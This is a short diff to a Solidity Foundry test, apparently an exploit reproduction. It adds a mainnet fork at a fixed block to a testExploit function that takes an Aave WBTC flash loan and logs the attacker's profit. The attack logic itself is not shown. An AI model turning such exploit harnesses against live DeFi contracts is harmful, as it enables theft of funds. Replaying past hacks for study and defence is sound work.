@@ -15,8 +15,14 @@ contract ContractTest is DSTest {
     address[] assets = [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599];
     uint256[] amounts = [2700000000000];
     uint256[] modes = [0];
-
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
     
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 14972418);
+        cheats.selectFork(mainnetFork);
+    }
+
     function testExploit() public{         
         aaveLendingPool.flashLoan(address(this),assets,amounts,modes,address(this),"0x",0);
         emit log_named_uint("After flashloan repaid, profit in WBTC of attacker:", WBTC.balanceOf(address(this))); 
